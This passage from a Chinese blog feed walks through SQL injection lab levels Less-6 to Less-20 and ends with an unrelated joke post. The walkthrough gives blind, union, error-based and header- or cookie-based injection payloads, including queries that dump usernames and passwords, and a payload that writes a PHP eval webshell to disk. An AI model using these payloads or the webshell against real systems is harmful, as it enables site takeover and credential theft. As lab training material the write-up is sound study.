[[:&lt;:]],[[:&gt;:]]word 边界,
3. like 
'n%'以N开始的
'%g'以g结尾
'%s%'包含s
4.substr(a,b,c) 从b开始,截取a字符c位长度
ascii(substr((select database()),1,1)2分法获得字符 
//当没有在当前数据库下没有回显,一般不适用
</code></pre>
<h3 id="猜测字符方法">猜测字符方法</h3>
<pre><code>burpsuite爆破
手动二分法
脚本
</code></pre>
<h3 id="示例">示例</h3>
<pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
<h1 id="less-6">less-6</h1>
<p>注入漏洞：id=1”--+,布尔型盲注</p>
<h1 id="less-7一句话木马">less-7（一句话木马）</h1>
<p>注入漏洞：id=1'))--+,布尔型盲注</p>
<h3 id="知识点补充-3">知识点补充：</h3>
<pre><code class="language-sql">1.一句话木马： &lt;?php @eval($_POST['attack']);?&gt;
【基本原理】利用文件上传漏洞,往目标网站中上传一句话木马,然后你就可以在本地通过中国菜刀chopper.exe即可获取和控制整个网站目录。@表示后面即使执行错误,也不报错。eval()函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['attack']表示从页面中获得attack这个参数值。
【条件】
(1)木马上传成功,未被杀;
(2)知道木马的路径在哪;
(3)上传的木马能正常运行。
2.load_file('文件路径')：读取本地文件 (避免特殊字符使用双斜杠\\)
3.into outfile：写文件
</code></pre>
<h3 id="示例-2">示例</h3>
<pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
<h1 id="less-8">less-8</h1>
<p>注入漏洞：id=1'--+,布尔盲注</p>
<h1 id="less-9时间盲注">less-9（时间盲注）</h1>
<p>注入漏洞：id=1' --+,时间盲注</p>
<h3 id="实例">实例</h3>
<pre><code class="language-sql">id=1' and sleep(5)--+ //延迟5秒表示注入成功
</code></pre>
<h1 id="less-10">less-10</h1>
<p>注入漏洞：id=1”--+,时间盲注</p>
<h1 id="less-11">less-11</h1>
<p>注入漏洞：uname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h3 id="实例-和get相同">实例 (和get相同)</h3>
<pre><code class="language-sql">//查多少个注入点
uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit

//查到数据库——security
uname=n' union select 1,schema_name from information_schema.schemata limit 2,1 #&amp;passwd=admin&amp;submit=Submit 

//查看表——users
uname=n' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'  #&amp;passwd=admin&amp;submit=Submit

//查看列——username
uname=n' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'  #&amp;passwd=admin&amp;submit=Submit

//查所有username
uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd=admin&amp;submit=Submit

//查询用户~密码
uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
<p>注入漏洞：uname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit<br>
布尔型盲注</p>
<h3 id="实例-2">实例</h3>
<pre><code class="language-sql">burp suite爆破：
uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
布尔型盲注</p>
<h1 id="less-15">less-15</h1>
<p>注入漏洞：uname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit<br>
注入点在passwd,其他一样<br>
布尔型盲注</p>
<h1 id="less-16">less-16</h1>
<p>注入漏洞：uname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit<br>
布尔型盲注</p>
<h1 id="less-17更新漏洞">less-17（更新漏洞）</h1>
<p>注入漏洞：uname=admin &amp;passwd=dadad' # &amp;submit=Submit<br>
更新密码存在注入漏洞</p>
<h3 id="知识点补充-4">知识点补充</h3>
<pre><code>updatexml(XML_document,XPath_string,new_value)
第一个参数：string格式,xml文件对象名称
第二个参数：xpath格式字符串
第三个参数：string格式,替换查找符合条件的数据
作用：改变文档中符合节点条件的节点值
</code></pre>
<h3 id="实例-3">实例</h3>
<pre><code class="language-sql">//返回当前数据库
uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
<p>注入漏洞：<br>
User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
//   '闭合<br>
User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
//另一种闭合</p>
<h3 id="实例-4">实例</h3>
<pre><code>//查库
User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
<h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
<p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
注入点在referer,其他一样</p>
<h1 id="less-20-cookie漏洞">less-20 (cookie漏洞)</h1>
<p>注入漏洞：cookie中value值'    #注入</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于zyy是只猪这件事]]></title>
        <id>https://z0ekball.github.io/post/a-sa-da-d/</id>
        <link href="https://z0ekball.github.io/post/a-sa-da-d/">
        </link>
        <updated>2021-03-08T13:13:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="众所周知猪的睫毛很长">众所周知，猪的睫毛很长</h2>
<p>zyy也不例外</p>
<h2 id="猪猪不爱干净">猪猪不爱干净</h2>
<p>zyy也是个不爱洗澡的邋遢怪</p>
<h2 id="猪的毛很卷">猪的毛很卷</h2>
<p>zyy头上几撮飞毛正是如此</p>
]]></content>
    </entry>
</feed>